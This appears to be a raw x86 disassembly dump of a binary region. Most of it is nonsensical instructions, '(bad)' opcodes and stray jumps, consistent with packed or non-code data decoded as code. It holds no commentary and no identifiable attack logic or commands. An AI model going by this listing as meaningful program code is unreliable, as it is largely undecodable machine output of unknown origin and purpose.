  41c735:	int3   
  41c736:	int3   
  41c737:	int3   
  41c738:	int3   
  41c739:	int3   
  41c73a:	add    BYTE PTR [eax],al
  41c73c:	pop    eax
  41c73d:	inc    ebp
  41c73e:	mov    ds:0xc9000084,al
  41c743:	push   ebx
  41c744:	mov    edi,0xb9701ef5
  41c749:	dec    esi
  41c74a:	lock std 
  41c74c:	adc    ebx,DWORD PTR [esi-0x70]
  41c74f:	inc    eax
  41c750:	xor    bh,ah
  41c752:	push   ecx
  41c753:	outs   dx,BYTE PTR ds:[esi]
  41c754:	ins    DWORD PTR es:[edi],dx
  41c755:	rcr    DWORD PTR [edx-0x1c],1
  41c758:	xor    ch,BYTE PTR [edx]
  41c75a:	add    DWORD PTR [esi+0x4cfb3289],0x8c1510cb
  41c764:	jae    0x41c766
  41c766:	add    BYTE PTR [edx-0x26fffff6],dh
  41c76c:	xchg   esp,eax
  41c76d:	lods   eax,DWORD PTR ds:[esi]
  41c76e:	add    al,ch
  41c770:	sub    cl,BYTE PTR ds:0x1266145
  41c776:	inc    edx
  41c777:	push   0xbb6a659a
  41c77c:	popa   
  41c77d:	add    BYTE PTR [edx],ch
  41c77f:	cmp    al,0x35
  41c781:	mov    al,ds:0x467870d7
  41c786:	ja     0x41c7b1
  41c788:	call   0xf2eb075
  41c78d:	fst    DWORD PTR [esi+0x8]
  41c790:	mov    ebx,0xf7d90ead
  41c795:	les    ebx,FWORD PTR [edx]
  41c797:	mov    edi,0x8b8254e6
  41c79c:	pop    ss
  41c79d:	push   es
  41c79e:	data16 cmp al,BYTE PTR [eax+0x35]
  41c7a2:	shl    cl,1
  41c7a4:	rol    DWORD PTR [eax-0x1717ddcf],1
  41c7aa:	mov    al,ds:0xe8e8549b
  41c7af:	call   0x41c7b3
  41c7b4:	(bad)  
  41c7b5:	(bad)  
  41c7b6:	(bad)  
  41c7b7:	(bad)  
  41c7b8:	jmp    eax
  41c7ba:	(bad)  
  41c7bb:	fmul   QWORD PTR [ebp-0x72727273]
  41c7c1:	lea    ecx,[ebp+0x8d8d]
  41c7c7:	in     eax,dx
  41c7c8:	shl    BYTE PTR [eax-0x59],cl
  41c7cb:	rep ins BYTE PTR es:[edi],dx
  41c7cd:	lods   eax,DWORD PTR ds:[esi]
  41c7ce:	addr16 pop ebx
  41c7d0:	mov    eax,ds:0x2b075782
  41c7d5:	lods   al,BYTE PTR ds:[esi]
  41c7d6:	ss inc esp
  41c7d8:	push   cs
  41c7d9:	(bad)  
  41c7da:	(bad)  
  41c7db:	jmp    0x41c7bb
  41c7dd:	mov    BYTE PTR [ebx-0x12960000],dh
  41c7e3:	add    BYTE PTR [eax],al
  41c7e5:	retf   0x1b
  41c7e8:	add    BYTE PTR [edx-0x6bc0bd34],al
  41c7ee:	sub    eax,0x369dcc58
  41c7f3:	adc    BYTE PTR [ebx+0x12],al
  41c7f6:	stc    
  41c7f7:	jmp    0x83cac68e
  41c7fc:	(bad)  
  41c7fd:	into   
  41c7fe:	scas   eax,DWORD PTR es:[edi]
  41c7ff:	jmp    0x347b:0xf88b005d
  41c806:	pop    edx
  41c807:	mov    ecx,DWORD PTR [ebx+0x2f9a748b]
  41c80d:	xor    eax,0x35543a2b
  41c812:	cmc    
  41c813:	cmp    eax,0xf4df243b
  41c818:	push   ecx
  41c819:	ror    BYTE PTR [esi+0x1d],1
  41c81c:	push   ebp
  41c81d:	mov    ah,0x5b
  41c81f:	sahf   
  41c820:	popa   
  41c821:	jbe    0x41c86c
  41c823:	xchg   esp,eax
  41c824:	add    esi,DWORD PTR [esi+ecx*1+0x129f375f]
  41c82b:	xchg   BYTE PTR [edi-0xce87475],bl
  41c831:	mov    ecx,DWORD PTR [ebx-0x72727275]
  41c837:	lea    ecx,[ebp-0x72727273]
  41c83d:	das    
  41c83e:	loope  0x41c7de
  41c840:	je     0x41c8b6
  41c842:	je     0x41c8b8
  41c844:	je     0x41c8ba
  41c846:	je     0x41c8bc
  41c848:	je     0x41c7cf
  41c84a:	test   DWORD PTR [eax+0x6],ecx
  41c84d:	aas    
  41c84e:	ins    BYTE PTR es:[edi],dx
  41c84f:	mov    ah,0x6c
  41c851:	mov    ds:0xd98c6975,al
  41c856:	test   DWORD PTR [eax-0x1d],eax
  41c859:	loop   0x41c861
  41c85b:	cmp    al,0x94
  41c85d:	lea    eax,[edx]
  41c85f:	ins    BYTE PTR es:[edi],dx
  41c860:	and    al,0xa0
  41c862:	cmp    BYTE PTR [ebp+0x3c4ddd85],al
  41c868:	ficom  DWORD PTR [eax-0x2281ff33]
  41c86e:	je     0xb660c662
  41c874:	enter  0x8ce1,0xa8
  41c878:	push   cs
  41c879:	int    0x95
  41c87b:	imul   esi,DWORD PTR [eax+0x7728aace],0xcc8585b1
  41c885:	shl    bh,0x85
  41c888:	test   DWORD PTR [ebx+0x4c],ecx
  41c88b:	or     BYTE PTR [ebp-0x3a874a8b],al
  41c891:	loopne 0x41c8a1
  41c893:	out    dx,al
  41c894:	test   BYTE PTR [edi],0xf5
  41c897:	inc    eax
  41c898:	jns    0x41c85b
  41c89a:	push   edx
  41c89b:	mov    esi,0x3738d760
  41c8a0:	jg     0x41c88c
  41c8a2:	xor    ebx,DWORD PTR [edi+0x27]
  41c8a5:	lods   al,BYTE PTR ds:[esi]
  41c8a6:	jne    0x41c91d
  41c8a8:	jne    0x41c86b
  41c8aa:	jo     0x41c921
  41c8ac:	jne    0x41c85a
  41c8ae:	or     esi,DWORD PTR [ebp+0x75]
  41c8b1:	jne    0x41c8b3
	...
  41c8bb:	repnz jecxz 0x41c8e1
  41c8be:	sub    esi,eax
  41c8c0:	fst    st(5)
  41c8c2:	xchg   BYTE PTR [edx-0x12],ah
  41c8c5:	(bad)  
  41c8c8:	std    
  41c8c9:	sub    edx,DWORD PTR [esi+0x130c76d9]
  41c8cf:	out    dx,al
  41c8d0:	pop    ds
  41c8d1:	les    ecx,FWORD PTR [edx+0x0]
	...
  41c8dc:	mov    ecx,DWORD PTR [ebx+0x84f52a]
  41c8e2:	mov    ecx,DWORD PTR [ebx+0x26477901]
  41c8e8:	arpl   WORD PTR [edi+0x5f75e551],si
  41c8ee:	pop    ecx
  41c8ef:	dec    esi
  41c8f0:	popa   
  41c8f1:	add    eax,0x36e374e9
  41c8f6:	(bad)  [edx-0x76]
  41c8f9:	fadd   QWORD PTR [ebp+0x140285cd]
  41c8ff:	sbb    edi,DWORD PTR ds:0x71cbfbb1
  41c905:	pop    ebx
  41c906:	fisttp QWORD PTR [ebx-0x743e9275]
  41c90c:	mov    eax,DWORD PTR [ecx+0x2e]
  41c90f:	and    BYTE PTR [ebx+eiz*2+0x69],ch
  41c913:	inc    esp
  41c914:	arpl   WORD PTR [bp+si+0x77],sp
  41c918:	outs   dx,BYTE PTR ds:[esi]
  41c919:	and    ch,BYTE PTR [edi+0x20]
  41c91c:	and    BYTE PTR ds:0x69656f62,cl
  41c922:	and    BYTE PTR gs:[esi],ch
  41c925:	jns    0x41c98a
  41c927:	arpl   WORD PTR [eax],sp
  41c929:	outs   dx,BYTE PTR ds:[esi]
  41c92a:	jb     0x41c995
  41c92c:	popa   
  41c92d:	inc    esp
  41c92e:	outs   dx,BYTE PTR ds:[esi]
  41c92f:	outs   dx,DWORD PTR ds:[esi]
  41c930:	arpl   WORD PTR [ebp+0x65],bp
  41c933:	jb     0x41c955
  41c935:	je     0x41c9ab
  41c937:	outs   dx,BYTE PTR ds:[esi]
  41c938:	and    BYTE PTR [eax+eiz*1+0x50],dh
  41c93c:	and    BYTE PTR [ebp+0x6f],ch
  41c93f:	cmp    eax,0x6f4d4d65
  41c944:	addr16 jbe 0x41c975
  41c947:	jne    0x41c977
  41c949:	and    BYTE PTR [ebx+0x65],dh
  41c94c:	jo     0x41c98a
  41c94e:	push   eax
  41c94f:	je     0x41c9c4
  41c951:	outs   dx,WORD PTR ds:[esi]
  41c953:	jne    0x41c977
  41c955:	gs ins DWORD PTR es:[edi],dx
  41c957:	and    BYTE PTR [ebx+0x63],dh
  41c95a:	and    BYTE PTR [ebp+0x2c],ch
  41c95d:	gs inc ecx
  41c95f:	jo     0x41c981
  41c961:	gs and bl,BYTE PTR cs:[ebp-0x1e]
  41c966:	mov    eax,0xeec2008b
  41c96b:	arpl   WORD PTR [edx+edx*1],cx
  41c96e:	jo     0x41c93e
  41c970:	ror    BYTE PTR [edi-0xc],cl
  41c973:	dec    eax
  41c974:	xchg   ecx,eax
  41c975:	or     bl,dl
  41c977:	mov    al,0x63
  41c979:	or     al,0xcd
  41c97b:	(bad)  
  41c97c:	mov    bh,0x7d
  41c97e:	je     0x41c9d1
  41c980:	aam    0x0
  41c982:	add    BYTE PTR [eax],al
  41c984:	inc    esp
  41c985:	outs   dx,DWORD PTR ds:[esi]
  41c986:	div    BYTE PTR [edi]
  41c988:	push   edi
  41c989:	mov    ds:0x7a608946,al
  41c98e:	dec    esi
  41c98f:	outs   dx,BYTE PTR ds:[esi]
  41c990:	xchg   ebx,eax
  41c991:	daa    
  41c992:	ins    BYTE PTR es:[edi],dx
  41c993:	pushf  
  41c994:	mov    bh,0xae
  41c996:	mov    al,ds:0x50e4a3d3
  41c99b:	cmp    edi,ecx
  41c99d:	push   edx
  41c99e:	jecxz  0x41c9ce
  41c9a0:	jnp    0x41c9a2
  41c9a2:	add    BYTE PTR [ecx+edx*4+0x58],dl
  41c9a9:	lea    ecx,[ebp-0x72727273]
  41c9af:	lea    ecx,[ebp+0x6579748d]
	...
  41c9bd:	add    BYTE PTR [ebx+0x25a7a58b],cl
  41c9c3:	push   ebx
  41c9c4:	out    dx,eax
  41c9c5:	mov    ecx,0xe1f4de2c
  41c9ca:	and    eax,0x9f56921
  41c9cf:	jmp    0x41c9b8
  41c9d1:	sbb    al,0x82
  41c9d3:	daa    
  41c9d4:	(bad)  
  41c9d5:	jmp    0x8bcd01d8
  41c9da:	mov    ?,eax
  41c9dc:	mov    ecx,DWORD PTR [ebx-0x7474e714]
  41c9e2:	mov    ecx,0x92095b2d
  41c9e7:	in     al,dx
  41c9e8:	adc    edx,DWORD PTR [ecx-0x1c]
  41c9eb:	add    BYTE PTR [eax+eax*8],bh
  41c9ee:	mov    esp,0xeca63cc6
  41c9f3:	push   ebp
  41c9f4:	call   0x8b3c:0x378de648
  41c9fb:	lea    edx,[edx+eax*4-0x7272b1b9]
  41ca02:	(bad)  
  41ca03:	into   
  41ca04:	imul   eax,DWORD PTR [ebx+esi*1],0xf7df9cd8
  41ca0b:	mov    eax,0x22ab7a7c
  41ca10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca11:	jge    0x41c9fb
  41ca13:	inc    esi
  41ca14:	fstp   TBYTE PTR [ebx-0x29]
  41ca17:	mov    ebp,0x1381d997
  41ca1d:	xchg   ebp,eax
  41ca1e:	ror    BYTE PTR [ebp+0x53f6c391],1
  41ca24:	inc    edi
  41ca25:	adc    eax,0x593f8d8d
  41ca2a:	lea    ecx,[ebp-0x3f3f3f73]
  41ca30:	rol    al,0xc0
  41ca33:	rol    al,0xc0
  41ca36:	jmp    0x0:0xe4bb
  41ca3d:	add    BYTE PTR [eax],al
  41ca3f:	add    BYTE PTR [eax],al
  41ca41:	add    BYTE PTR [eax+0x50],dl
  41ca44:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41ca46:	cmp    DWORD PTR [ebp-0x52],edx
  41ca49:	call   0x77726b48
  41ca4e:	in     eax,dx
  41ca4f:	and    ch,BYTE PTR [edx+0x6c]
  41ca52:	ja     0x41ca5e
  41ca54:	ret    
  41ca55:	stc    
  41ca56:	pop    edi
  41ca57:	jecxz  0x41ca05
  41ca59:	pop    edi
  41ca5a:	jo     0x41ca8a
  41ca5c:	push   eax
  41ca5d:	push   eax
  41ca5e:	rcl    BYTE PTR [eax-0x38e6be78],0xca
  41ca65:	jmp    0xb32cd229
  41ca6a:	adc    ch,BYTE PTR [edx-0x3f]
  41ca6d:	inc    ebx
  41ca6e:	es ror ah,cl
  41ca71:	jo     0x41ca16
  41ca73:	pop    esi
  41ca74:	adc    al,0x32
  41ca76:	aad    0x6d
  41ca78:	pop    edi
  41ca79:	xor    al,0xe3
  41ca7b:	push   eax
  41ca7c:	push   eax
  41ca7d:	cdq    
  41ca7e:	jo     0x41cabb
  41ca80:	push   eax
  41ca81:	push   eax
  41ca82:	(bad)  
  41ca83:	lds    edi,FWORD PTR [edx]
  41ca85:	push   eax
  41ca86:	psubusb mm7,QWORD PTR [ecx-0x7175e1dd]
  41ca8d:	ins    DWORD PTR es:[edi],dx
  41ca8e:	jle    0x41caff
  41ca90:	bound  esp,QWORD PTR [ecx]
  41ca92:	add    edx,DWORD PTR [edx+edx*8]
  41ca95:	dec    ecx
  41ca96:	out    dx,al
  41ca97:	cli    
  41ca98:	popf   
  41ca99:	(bad)  
  41ca9a:	pop    edi
  41ca9b:	inc    ecx
  41ca9c:	adc    ecx,DWORD PTR [edi+0xf0f0f40]
  41caa2:	mov    fs:0x56e20f0f,al
  41caa8:	(bad)  
  41caa9:	(bad)  
  41caaa:	sldt   WORD PTR [eax]
  41caad:	add    BYTE PTR [eax],al
  41caaf:	add    BYTE PTR [eax],al
  41cab1:	add    BYTE PTR [eax],al
  41cab3:	add    BYTE PTR [ecx-0x5b],bh
  41cab6:	gs cld 
  41cab8:	cdq    
  41cab9:	sti    
  41caba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cabb:	(bad)  
  41cabc:	jns    0x41cb15
  41cabe:	inc    edi
  41cabf:	pushf  
  41cac0:	stc    
  41cac1:	push   ss
  41cac2:	mov    dh,0x6d
  41cac4:	sbb    esp,0x39
  41cac7:	enter  0x96f4,0x8e
  41cacb:	std    
	...
  41cad4:	add    BYTE PTR [esp+esi*2-0x3],dh
  41cad8:	fcom   QWORD PTR [ecx+0xf]
  41cadb:	je     0x41cb51
  41cadd:	not    DWORD PTR [ebx+ecx*1]
  41cae0:	mov    esi,0xd64512be
  41cae5:	or     eax,DWORD PTR [eax+edx*4+0x72]
  41cae9:	sahf   
  41caea:	mov    bl,dl
  41caec:	out    0x31,eax
  41caee:	fsubp  st(2),st
  41caf0:	ficomp WORD PTR [ecx-0x7d]
  41caf3:	pop    es
  41caf4:	cli    
  41caf5:	data16 mov BYTE PTR [edi+0x31],dl
  41caf9:	mov    bh,BYTE PTR [ebx-0xf]
  41cafc:	fld    DWORD PTR [eax+esi*4]
  41caff:	fnsave [esp+esi*2+0x47]
  41cb03:	push   eax
  41cb04:	je     0x41cb7a
  41cb06:	int3   
  41cb07:	sbb    esi,DWORD PTR ds:[edi+edi*8-0x18]
  41cb0c:	aam    0x3d
  41cb0e:	es popf 
  41cb10:	dec    ebp
  41cb11:	mov    al,0x26
  41cb13:	inc    eax
  41cb14:	hlt    
  41cb15:	hlt    
  41cb16:	xchg   esi,eax
  41cb17:	ds sub bh,bh
  41cb1a:	xor    al,0xbf
  41cb1c:	popf   
  41cb1d:	mov    al,ds:0xecba9064
  41cb22:	std    
  41cb23:	(bad)  
  41cb24:	(bad)  
  41cb25:	(bad)  
  41cb26:	in     al,dx
  41cb27:	lock mov ds:0x5da8b9a1,al
  41cb2d:	jp     0x41cac1
  41cb2f:	pushf  
  41cb30:	inc    esp
  41cb31:	push   cs
  41cb32:	push   ss
  41cb33:	mov    esp,?
  41cb35:	mov    al,ds:0xb3abe2a6
  41cb3a:	(bad)  
  41cb3c:	sbb    eax,0xc7dbcfa3
  41cb41:	jmp    0x41cacb
  41cb43:	(bad)  
  41cb44:	(bad)  
  41cb45:	(bad)  
  41cb46:	call   0x41ca96
  41cb4b:	push   0x6a
  41cb4d:	push   0x6a
  41cb4f:	push   0x6a
  41cb51:	push   0x6a
  41cb53:	push   0x6f
  41cb55:	xor    DWORD PTR [edi-0x1],esp
  41cb5b:	(bad)  
  41cb5c:	(bad)  
  41cb5d:	(bad)  
  41cb5e:	(bad)  
  41cb5f:	inc    DWORD PTR [ebx+0x7a755883]
  41cb65:	addr16 (bad) 
  41cb67:	adc    DWORD PTR [ecx],esp
  41cb69:	addr16 iret 
  41cb6b:	(bad)  
  41cb6c:	(bad)  
  41cb6d:	dec    ecx
  41cb6e:	mov    DWORD PTR [ebp+0x2a],esp
  41cb71:	imul   edx,DWORD PTR [ebx],0xffffffee
  41cb74:	and    BYTE PTR [esi-0x32],dh
  41cb77:	push   ebp
  41cb78:	mov    ebp,0x4183833e
  41cb7d:	rol    DWORD PTR [ebx-0x7c52c87d],1
  41cb83:	sbb    DWORD PTR [edx+0x6f10b271],0xffffffa3
  41cb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb8b:	or     DWORD PTR [ebx],eax
  41cb8d:	cmp    ebp,ebx
  41cb8f:	cmc    
  41cb90:	xchg   ebp,eax
  41cb91:	mov    eax,ds:0x707ddf0f
  41cb96:	int    0xac
  41cb98:	or     edx,ebp
  41cb9a:	das    
  41cb9b:	mov    ecx,0xd14b0083
  41cba0:	in     eax,dx
  41cba1:	adc    al,BYTE PTR [eax]
  41cba3:	add    BYTE PTR [eax],al
  41cba5:	fisttp WORD PTR [ebx]
  41cba7:	mov    esi,0x17a74514
  41cbac:	cmp    BYTE PTR [ebx+eiz*1+0x60],bh
  41cbb0:	add    eax,0xf09d437f
  41cbb5:	jg     0x41cbd5
  41cbb7:	clc    
  41cbb8:	retf   0xec51
  41cbbb:	cmp    BYTE PTR ss:[eax],bl
  41cbbe:	das    
  41cbbf:	pop    edx
  41cbc0:	hlt    
  41cbc1:	fst    QWORD PTR [ebp+0x22]
  41cbc4:	stc    
  41cbc5:	mov    edx,DWORD PTR [ecx+0x5a]
  41cbc8:	add    BYTE PTR [eax],al
  41cbca:	pop    edi
  41cbcb:	cwde   
	...
  41cbd8:	shr    al,1
  41cbda:	dec    ecx
	...
  41cbe3:	jae    0x41cc28
  41cbe5:	je     0x41cc37
  41cbe7:	outs   dx,DWORD PTR ds:[esi]
  41cbe8:	gs jb  0x41cc54
  41cbeb:	imul   esi,DWORD PTR [ebp+0x76],0x3e20726d
  41cbf2:	jne    0x41cc67
  41cbf4:	ins    DWORD PTR es:[edi],dx
  41cbf5:	sub    DWORD PTR [ebp+0x6c],ecx
  41cbf8:	gs ins DWORD PTR es:[edi],dx
  41cbfa:	ins    DWORD PTR es:[edi],dx
  41cbfb:	or     ch,BYTE PTR [esi]
  41cbfd:	imul   ebp,DWORD PTR [edi+0x20],0x69622c6f
  41cc04:	jbe    0x41cc34
  41cc06:	ins    BYTE PTR es:[edi],dx
  41cc07:	cmp    al,0x69
  41cc09:	outs   dx,DWORD PTR ds:[esi]
  41cc0a:	cs gs and BYTE PTR gs:[edi+0xa],ah
  41cc10:	jae    0x41cc32
  41cc12:	imul   esp,DWORD PTR [ecx+0x3e],0x202e4169
  41cc19:	push   0x636f706d
  41cc1e:	ins    DWORD PTR es:[edi],dx
  41cc1f:	ins    BYTE PTR es:[edi],dx
  41cc20:	outs   dx,BYTE PTR ds:[esi]
  41cc21:	outs   dx,DWORD PTR ds:[esi]
  41cc22:	or     ah,BYTE PTR [ebp+0x2f]
  41cc25:	cmp    dl,BYTE PTR [edx+0x6d]
  41cc28:	inc    esp
  41cc29:	cmp    dh,BYTE PTR [ebx+0x6f]
  41cc2c:	add    bh,bh
  41cc2e:	dec    DWORD PTR [edi+0x40]
  41cc31:	sahf   
  41cc32:	dec    edi
  41cc33:	xacquire xchg BYTE PTR [ebp+0x9a8c844],al
  41cc3a:	aad    0x8d
  41cc3c:	jo     0x41cc23
  41cc3e:	mov    bh,0x13
  41cc40:	dec    ecx
  41cc41:	movnti DWORD PTR [ebx],edx
  41cc44:	adc    ecx,DWORD PTR [edx+eiz*2-0x6b930001]
  41cc4b:	mov    edi,?
  41cc4d:	jnp    0x41ccb5
  41cc4f:	cmp    eax,0xdf87876e
  41cc54:	jge    0x41cbf8
  41cc56:	jae    0x41cc35
  41cc58:	retf   
  41cc59:	and    WORD PTR ds:0xab4f928f,dx
  41cc60:	sub    ecx,DWORD PTR [ecx]
  41cc62:	jne    0x41cc37
  41cc64:	adc    al,0xdd
  41cc66:	(bad)  
  41cc67:	push   DWORD PTR [ebx]
  41cc69:	popa   
  41cc6a:	xchg   edi,eax
  41cc6b:	(bad)  
  41cc6c:	jmp    FWORD PTR [eax]
  41cc6e:	mov    cl,0xd8
  41cc70:	inc    DWORD PTR [eax]
  41cc72:	sbb    dl,0x53
  41cc75:	sbb    esp,DWORD PTR [edi-0x58]
  41cc78:	(bad)  
  41cc79:	sbb    eax,0x5599fe29
  41cc7e:	test   edx,esp
  41cc80:	out    dx,eax
  41cc81:	or     esp,edi
  41cc83:	ja     0x41cc79
  41cc85:	pop    eax
  41cc86:	fs sbb eax,0xffc5
  41cc8c:	add    cl,bl
  41cc8e:	rol    DWORD PTR [eax],1
  41cc90:	add    dl,ah
  41cc92:	pop    DWORD PTR [eax]
  41cc94:	add    BYTE PTR [eax],al
  41cc96:	call   0xe92ab583
  41cc9b:	call   0xc42ab588
  41cca0:	outs   dx,BYTE PTR ds:[esi]
  41cca1:	or     eax,0x26ab920c
  41cca6:	sbb    eax,0xb2e49c81
  41ccab:	mov    bl,0xfb
  41ccad:	sbb    edx,0x3b
  41ccb0:	es xchg edi,eax
  41ccb2:	call   0x8d8d:0x2b700ed6
  41ccb9:	lea    ecx,[ebp-0x72727273]
  41ccbf:	lea    ecx,[esp+ecx*1]
  41ccc2:	(bad)  
  41ccc3:	popa   
  41ccc4:	rcr    BYTE PTR [ebp+0x2360c0c],cl
  41ccca:	mov    ebp,0xea494cfe
  41cccf:	aas    
  41ccd0:	jmp    0x5be0:0x422c6077
  41ccd7:	stc    
  41ccd8:	fisub  WORD PTR [ebp+0xd]
  41ccdb:	lods   eax,DWORD PTR ds:[esi]
  41ccdc:	call   0xbe99b40b
  41cce1:	sbb    dl,BYTE PTR [edi-0x268c354e]
  41cce7:	push   0x3d
  41cce9:	inc    edx
  41ccea:	jb     0x41ccf8
  41ccec:	or     al,0xb
  41ccee:	sub    eax,0x3b6a0c0c
  41ccf3:	test   al,0xc
  41ccf5:	add    BYTE PTR [ecx],ch
  41ccf7:	add    al,0xba
  41ccf9:	jae    0x41ccfe
  41ccfb:	pop    esp
  41ccfc:	push   edx
  41ccfd:	imul   esi,DWORD PTR [ebx],0xee77a7f8
  41cd03:	and    DWORD PTR [ebx-0x1067017e],0x4e
  41cd0a:	push   0xb559fd
  41cd0f:	add    BYTE PTR [eax],al
  41cd11:	pop    esi
  41cd12:	in     eax,0xcd
  41cd14:	sbb    ah,BYTE PTR [ebx+0x601572b9]
  41cd1a:	hlt    
  41cd1b:	adc    DWORD PTR [ebp-0x35],0xffffffc5
  41cd1f:	jo     0x41cd68
  41cd21:	jmp    0x41cd14
  41cd23:	or     DWORD PTR [ecx-0x7d264be4],0x5152b00a
  41cd2d:	mov    dl,0x0
  41cd2f:	add    cl,al
  41cd31:	pop    ebx
  41cd32:	retf   
  41cd33:	add    BYTE PTR [eax],al
  41cd35:	add    al,al
  41cd37:	rol    al,0xc0
  41cd3a:	rol    al,0xc0
  41cd3d:	rol    al,0xc4
  41cd40:	mov    ebx,0xb3
  41cd45:	add    BYTE PTR [eax],al
  41cd47:	add    BYTE PTR [eax],al
  41cd49:	add    BYTE PTR [eax],al
  41cd4b:	(bad)  
  41cd4c:	shrd   DWORD PTR [edx-0x2a],esi,0x98
  41cd51:	pop    esi
  41cd52:	add    eax,DWORD PTR [ebx]
  41cd54:	mov    ch,0xb5
  41cd56:	dec    ebp
  41cd57:	cmp    ah,0xb7
  41cd5a:	lea    ebp,[eax]
  41cd5c:	or     BYTE PTR [edx-0x47847653],cl
  41cd62:	jne    0x41cd63
  41cd64:	scas   eax,DWORD PTR es:[edi]
  41cd65:	(bad)  
  41cd66:	seta   BYTE PTR [edx]
  41cd69:	(bad)  
  41cd6a:	paddw  mm4,QWORD PTR [edx+0x35e20f0f]
  41cd71:	pop    ecx
  41cd72:	xchg   esi,eax
  41cd73:	je     0x41cd8a
  41cd75:	mov    eax,DWORD PTR [ebp+0x35193f72]
  41cd7b:	rcr    DWORD PTR [esi+0x38],0xdd
  41cd7f:	mov    ds:0x325082ee,al
  41cd84:	add    DWORD PTR [ecx+0x30890f74],ebp
  41cd8a:	jnp    0x41cd81
  41cd8c:	js     0x41cd17
  41cd8e:	mov    DWORD PTR [ecx+0x439312bc],ecx
  41cd94:	or     eax,0xa892671d
  41cd99:	jo     0x41cd68
  41cd9b:	and    DWORD PTR [eax-0x11672948],esi
  41cda1:	xlat   BYTE PTR ds:[ebx]
  41cda2:	or     al,0x5d
  41cda4:	push   ebx
  41cda5:	inc    edx
  41cda6:	fisub  WORD PTR [esi+0x43]
  41cda9:	ret    0x8363
  41cdac:	test   BYTE PTR [edi+ebx*4+0x56],dl
  41cdb0:	hlt    
  41cdb1:	retf   
  41cdb2:	or     eax,0x48da8989
  41cdb7:	mov    DWORD PTR [ecx-0x72727277],ecx
  41cdbd:	lea    ecx,[ebp-0x72727273]
  41cdc3:	mov    ecx,ss
  41cdc5:	popa   
	...
  41cdce:	add    BYTE PTR [eax],al
  41cdd0:	add    BYTE PTR [esi-0x63],dl
  41cdd3:	ror    DWORD PTR [ebx+0x4b],cl
  41cdd6:	addr16 in eax,0x69
  41cdd9:	mov    eax,ds:0x3038d67b
  41cdde:	cmp    al,0x0
  41cde0:	add    eax,0x7b8f205a
  41cde5:	loope  0x41cdb0
  41cde7:	jmp    0xad6:0xdd00000d
  41cdee:	loope  0x41ce1d
  41cdf0:	xchg   BYTE PTR [edi+ebx*8],cl
  41cdf3:	adc    al,dl
  41cdf5:	sbb    BYTE PTR [eax+0x6fb15471],al
  41cdfb:	and    DWORD PTR [edi+0x3baefcc6],eax
  41ce01:	pusha  
  41ce02:	int3   
  41ce03:	jmp    0x0:0xd4517ac3
  41ce0a:	js     0x41ce00
  41ce0c:	adc    al,BYTE PTR [eax]
  41ce0e:	add    ch,cl
  41ce10:	ja     0x41cda6
  41ce12:	add    BYTE PTR [eax],al
  41ce14:	jge    0x41ce22
  41ce16:	ret    
  41ce17:	fiadd  DWORD PTR [eax+0x5eea19fc]
  41ce1d:	adc    ecx,DWORD PTR [esi-0x46]
  41ce20:	xor    BYTE PTR [esi+0x63dfce85],dh
  41ce26:	cwde   
  41ce27:	push   eax
  41ce28:	mov    ds:0x2bbce,al
  41ce2d:	add    BYTE PTR [eax],al
  41ce2f:	in     eax,0xd9
  41ce31:	add    BYTE PTR [eax],al
  41ce33:	push   ds
  41ce34:	rol    DWORD PTR [eax],cl
  41ce36:	add    BYTE PTR [eax],al
  41ce38:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  41ce3f:	add    DWORD PTR [ebx+0x7d954aaa],0x65
  41ce46:	ins    DWORD PTR es:[edi],dx
  41ce47:	inc    esp
  41ce48:	bound  edi,QWORD PTR [ecx+0x53]
  41ce4b:	push   0x3d654d73
  41ce50:	cs cmp eax,0x6d3c5373
  41ce56:	cmp    al,0x20
  41ce58:	inc    esp
  41ce59:	imul   esp,DWORD PTR [eax],0x206d2941
  41ce5f:	outs   dx,DWORD PTR ds:[esi]
  41ce60:	jb     0x41ced6
  41ce62:	gs popa 
  41ce64:	bound  esp,QWORD PTR [ebp+0x6e]
  41ce67:	imul   edx,DWORD PTR [ebx+0x79],0x2061632e
  41ce6e:	outs   dx,DWORD PTR ds:[esi]
  41ce6f:	jbe    0x41cee1
  41ce71:	jb     0x41cec0
  41ce73:	gs gs jb 0x41ce97
  41ce77:	je     0x41cee6
  41ce79:	addr16 popa 
  41ce7b:	jb     0x41ceed
  41ce7d:	push   edi
  41ce7e:	or     eax,0x22632067
  41ce83:	outs   dx,DWORD PTR gs:[esi]
  41ce85:	ins    DWORD PTR es:[edi],dx
  41ce86:	inc    esp
  41ce87:	ins    DWORD PTR es:[edi],dx
  41ce88:	arpl   WORD PTR [ebp+ecx*1+0x6e],si
  41ce8c:	imul   esp,DWORD PTR ds:[ebp+0x61],0x223c656d
  41ce94:	arpl   WORD PTR [esi],di
  41ce96:	imul   ebp,DWORD PTR [edi+0x74],0x203d7269
  41ce9d:	imul   esi,DWORD PTR [ebp+0x6e],0x53742365
  41cea4:	ds ins DWORD PTR es:[edi],dx
  41cea6:	and    BYTE PTR [esi],ch
  41cea8:	jae    0x41cf19
  41ceaa:	and    BYTE PTR cs:[edx+0x53],dh
  41ceae:	jae    0x41cf19
  41ceb0:	cmp    al,0x73
  41ceb2:	sub    al,0x73
  41ceb4:	or     dh,BYTE PTR [esi+0x22]
  41ceb7:	jb     0x41cf22
  41ceb9:	je     0x41cf1b
  41cebb:	scas   eax,DWORD PTR es:[edi]
  41cebc:	jg     0x41cee4
  41cebe:	push   0x6c
  41cec0:	dec    edi
  41cec1:	in     eax,0x4b
  41cec3:	adc    ebp,ebx
  41cec5:	fidiv  WORD PTR [edi+edi*4+0x70c3b9f3]
  41cecc:	sbb    dh,dh
	...
  41ced6:	add    BYTE PTR [eax],al
  41ced8:	add    BYTE PTR [edx],dh
  41ceda:	inc    esp
  41cedb:	inc    edi
  41cedc:	dec    edi
  41cedd:	add    BYTE PTR [eax],al
  41cedf:	fwait
  41cee0:	pop    ss
  41cee1:	outs   dx,BYTE PTR ds:[esi]
  41cee2:	jns    0xfe102575
  41cee8:	mov    dh,0xd6
  41ceea:	ja     0x41cf00
  41ceec:	jg     0x41cf20
  41ceee:	jge    0x41cf0d
  41cef0:	outs   dx,DWORD PTR ds:[esi]
  41cef1:	jnp    0x41ce8e
  41cef3:	fiadd  DWORD PTR [edx]
  41cef5:	(bad)  
  41cef6:	xchg   edi,eax
  41cef7:	int    0x8
  41cef9:	sub    bh,BYTE PTR [esi-0x28244fdc]
